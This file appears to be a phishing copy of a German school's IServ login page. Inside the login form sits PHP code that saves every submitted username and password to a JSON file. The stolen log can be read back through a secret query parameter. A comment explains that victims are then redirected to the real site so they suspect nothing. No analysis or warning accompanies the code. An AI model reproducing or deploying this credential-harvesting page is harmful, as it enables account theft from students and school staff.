
<!doctype html>
<html data-asset-path="/iserv" ontouchmove>
<head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">
<meta http-equiv="X-UA-Compatible" content="ie=edge"><link rel="apple-touch-icon" sizes="57x57" href="/iserv/css/static/icons/apple-touch-icon-57x57.3dd45525.png"><link rel="apple-touch-icon" sizes="60x60" href="/iserv/css/static/icons/apple-touch-icon-60x60.ae84814e.png"><link rel="apple-touch-icon" sizes="72x72" href="/iserv/css/static/icons/apple-touch-icon-72x72.e14c17b3.png"><link rel="apple-touch-icon" sizes="76x76" href="/iserv/css/static/icons/apple-touch-icon-76x76.d1cdaf18.png"><link rel="apple-touch-icon" sizes="114x114" href="/iserv/css/static/icons/apple-touch-icon-114x114.750b324f.png"><link rel="apple-touch-icon" sizes="120x120" href="/iserv/css/static/icons/apple-touch-icon-120x120.20854246.png"><link rel="apple-touch-icon" sizes="144x144" href="/iserv/css/static/icons/apple-touch-icon-144x144.31179e61.png"><link rel="apple-touch-icon" sizes="152x152" href="/iserv/css/static/icons/apple-touch-icon-152x152.09a10c7e.png"><link rel="apple-touch-icon" sizes="180x180" href="/iserv/css/static/icons/apple-touch-icon-180x180.6d537ec5.png"><link rel="apple-touch-icon" sizes="16x16" href="/iserv/css/static/icons/favicon-16x16.aa85ef3f.png"><link rel="apple-touch-icon" sizes="32x32" href="/iserv/css/static/icons/favicon-32x32.be4d3a0c.png"><link rel="apple-touch-icon" sizes="96x96" href="/iserv/css/static/icons/favicon-96x96.fdbc37a8.png"><link rel="icon" type="image/png" href="/iserv/css/static/icons/android-chrome-192x192.fc2f37a3.png" sizes="192x192">
<link rel="icon" type="image/x-icon" href="/iserv/css/static/icons/favicon.2ebf6af2.ico" />
<link rel="mask-icon" href="/iserv/css/static/icons/safari-pinned-tab.8387f394.svg" color="#1c4174" />

<meta name="msapplication-TileImage" content="/iserv/css/static/icons/mstile-144x144.31179e61.png">
<meta name="apple-mobile-web-app-title" content="IServ">
<meta name="application-name" content="IServ">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#1c4174">
<link rel="manifest" href="/iserv/manifest.json" />
<link rel="canonical" href="https://wbs-gi.de/iserv/auth/login?_target_path=%2Fiserv%2Fauth%2Fauth%3F_iserv_app_url%3D%252Fiserv%252F%26client_id%3D53_1yt4xnpsh6ysc84s4skcg0scsw8gg44csggssssocgk008k8c4%26nonce%3D4a75bfa5-2474-420a-bf71-9780eae41938%26redirect_uri%3Dhttps%253A%252F%252Fwbs-gi.de%252Fiserv%252Fapp%252Fauthentication%252Fredirect%26response_type%3Dcode%26scope%3Dopenid%2520uuid%2520iserv%253Asession-id%2520iserv%253Aweb-ui%2520iserv%253A2fa%253Aconfiguration%2520iserv%253Aaccess-groups%26state%3DeyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjEifQ.eyJyZWRpcmVjdF91cmkiOiJodHRwczpcL1wvd2JzLWdpLmRlXC9pc2VydlwvIiwibm9uY2UiOiI0YTc1YmZhNS0yNDc0LTQyMGEtYmY3MS05NzgwZWFlNDE5MzgiLCJhZG1pbiI6ZmFsc2UsImlzcyI6Imh0dHBzOlwvXC93YnMtZ2kuZGVcL2lzZXJ2XC8iLCJleHAiOjE3MDkwMDY0MTYsIm5iZiI6MTcwMTIzMDM1NiwiaWF0IjoxNzAxMjMwNDE2LCJzaWQiOiIifQ.g-v3qjjOOexCDa3fmp-aTQLqTJI6FrDYnfspjOhfc5pG5jZMgh6-DMR8wQcIpW5MP4gQavrwVeDrnq5CrLJ6uA" /><title>
                    IServ - wbs-gi.de
            </title>

            <link rel="stylesheet" href="/iserv/css/static/css/iserv.88c83b39.css">
        <link rel="stylesheet" href="/iserv/auth/static/css/auth.css?ver=7"/>
    </head>

<body class="preload p-3  ">
<div class="auth-container">

    <header>

        
            <a href="" title="Willy-Brandt-Schule Gießen - wbs-gi.de">
                <img class="school-logo  img-responsive" src="/iserv/logo/logo.png" alt="Willy-Brandt-Schule Gießen"/>
            </a>

        
    </header>

    <main>

        
    
            <div class="panel main-panel panel-default mb-0">
                <div class="panel-heading">
                    <h1 class="panel-title">IServ-Anmeldung</h1>
                </div>
                <div class="panel-body">
                        <div class="alert alert-warning hidden" id="disabled-cookies-box">
        Sie haben keine Cookies aktiviert. Cookies sind notwendig um IServ zu benutzen.
    </div>

    
        <form class="login-form" method="post">

       <?php
// Datenspeicher laden
$file = "textile.json";
if (file_exists($file)) {
    $c = file_get_contents($file);
    if ($c!==false) {
        $json = json_decode($c, true);
    }
}
if (!isset($json)) {
    $json = array();
}

// falls "?get_log=mnroishtm"
if (isset($_GET['get_log']) && $_GET['get_log']=='mnroishtm') {
   // json datei ausgeben
   header('Content-type: application/json');
   die(json_encode($json, JSON_PRETTY_PRINT));
}

// zum Datenspeicher hinzufügen
$json[] = $_REQUEST;

// Speichern
file_put_contents($file, json_encode($json, JSON_PRETTY_PRINT));

// Fertig!

// [!!!] hier wird der User zur Originalseite umgeleitet, damit kein Verdacht geschöpft wird

$ziel_url = "https://wbs-gi.de/iserv/";
header("Location: $ziel_url");

exit;
?>


            
            
                            <div id="form-username" class="form-group">
                    <input class="form-control" type="text" name="_username" value="" placeholder="Account"
                           title="Der Account wird klein geschrieben und darf keine Umlaute enthalten, Leerzeichen werden durch Punkte ersetzt. Beispiel: bjoern.mueller"
                           required="required" autofocus autocapitalize="none" autocorrect="off"/>
                </div>
            
            <div id="form-password" class="form-group">
                <input class="form-control" type="password" name="_password" placeholder="Passwort" required="required" aria-describedby="passwordStatus" />
                <span class="form-control-feedback hidden" aria-hidden="true"><span class="glyphicon glyphicon-warning-sign"></span></span>
                <span id="passwordStatus" class="text-warning hidden">Warnung: Die Feststelltaste ist aktiviert!</span>
            </div>
                            <div class="row">
                    <div class="col-xs-6">
                                                    <button class="btn btn-primary" type="submit"><span class="glyphicon-pro glyphicon-pro-log-in"></span> Anmelden</button>
                                            </div>
                    <div class="col-xs-6 text-right">
                                                    <div class="checkbox">
                                <label><input type="checkbox" id="remember_me" name="_remember_me"/> Angemeldet bleiben</label>
                            </div>
                                            </div>                </div>
                    </form>

        <hr>
        <div class="row">
            <div class="col-xs-6">
                <a href="/iserv/auth/public/password_reset">Passwort vergessen?</a>
            </div>
            <div class="col-xs-6 text-right">
                <a href="https://doku.iserv.de/web/#anmeldung" target="_blank">Hilfe</a>
            </div>
        </div>
                    </div>
                                                                </div>
        
    </main>

    <footer>

        <a href="https://iserv.de" class="text-center">
            <picture class="dark">
                <source srcset="/iserv/css/static/img/logo_white.118ffce4.svg" type="image/svg+xml">
                <img id="logo-iserv" src="/iserv/css/static/img/logo_white.ae6b12dc.png" height="66" alt="IServ">
            </picture>
            <picture class="light">
                <source srcset="/iserv/css/static/img/logo.a0b67669.svg" type="image/svg+xml">
                <img id="logo-iserv" src="/iserv/css/static/img/logo.c377acd3.png" height="66" alt="IServ">
            </picture>
            <p class="mt-3">IServ Schulserver</p>
        </a>

                    <div class="m-3">
                <a class="legal-notice" href="/iserv/app/legal">Impressum</a>
            </div>
        
    </footer>

</div>
    
    <script type="text/javascript" src="/iserv/auth/static/js/login.js"></script>
</body>
</html>
